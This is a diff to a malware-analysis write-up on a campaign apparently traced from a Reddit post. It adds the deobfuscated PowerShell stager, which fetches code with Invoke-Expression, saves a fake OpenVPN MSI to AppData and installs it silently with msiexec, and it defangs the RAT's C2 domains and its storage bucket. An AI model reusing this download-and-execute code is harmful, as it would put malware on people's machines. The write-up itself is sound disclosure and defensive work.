@@ -44,7 +44,7 @@ https://www.reddit.com/r/cybersecurity_help/comments/1r4ae25/what_does_this_clic
 
 The primary PowerShell (.ps1) command downloads and executes instructions from:
 
-`storage.googleapis.com/release-v5-dl/fin2.txt`
+`Invoke-Expression(wget -usebas storage[.]googleapis[.]com/release-v5-dl/fin2.txt)`
 
 using **IEX (Invoke-Expression)**.
 
@@ -64,15 +64,24 @@ After removing the junk content, we obtain a Base64 string that is:
 
 The resulting payload downloads:
 
-`OpenVPN-2.6.17-I001-amd64.msi`
+```
+$uHVWZ = $env:AppData;
+function KjmJ($ytiy, $mKSCIavgD){
+	wget -usebasic $ytiy -o $mKSCIavgD
+	};
+function UTmmm($nGaeJTG){
+	KjmJ $nGaeJTG $mKSCIavgD
+	};
+$mKSCIavgD = $env:AppData + '\OpenVPN-2.6.17-I001-amd64.msi';
+UTmmm storage[.]googleapis[.]com/release-v5-dl/OpenVPN-2.6.17-I001-amd64.msi;
+msiexec.exe /qn /i $mKSCIavgD;;
+```
 
 from the same storage bucket and executes it.
 
 The storage bucket contains multiple payload variants.  
-The storage was reported and fully dumped into:
+The storage was reported & Dumped.
 
-`S3_Content.zip`  
-Password: `infected`
 
 ------------------------------------------------------------------------
 
@@ -203,10 +212,10 @@ The JavaScript contains multiple layers of obfuscation:
 The JavaScript RAT contains **4 hardcoded C2 server URLs** that the malware attempts to connect to for command and control communication:
 
 ```
-http://stat.greenslighttcodetdat.net
-http://aplalink.com
-http://altsocks101.com
-http://altsocks2.com
+http://stat[.]greenslighttcodetdat[.]net
+http://aplalink[.]com
+http://altsocks101[.]com
+http://altsocks2[.]com
 ```
 
 These domains are embedded directly in the JavaScript payload and serve as fallback mechanisms. If one C2 server is unavailable, the malware will attempt to contact the remaining servers to maintain persistent connectivity.
@@ -263,16 +272,16 @@ Port 10044 is used for persistent C2 communication.
 **C2 Server URLs (Hardcoded in JavaScript payload):**
 
 ```
-http://stat.greenslighttcodetdat.net
-http://aplalink.com
-http://altsocks101.com
-http://altsocks2.com
+http://stat[.]greenslighttcodetdat.net
+http://aplalink[.]com
+http://altsocks101[.]com
+http://altsocks2[.]com
 ```
 
 **Infrastructure:**
 
 ```
-storage.googleapis.com/release-v5-dl/*
+storage[.]googleapis[.]com/release-v5-dl/*
 ```
 
 Google Cloud Storage bucket used for payload hosting and distribution.
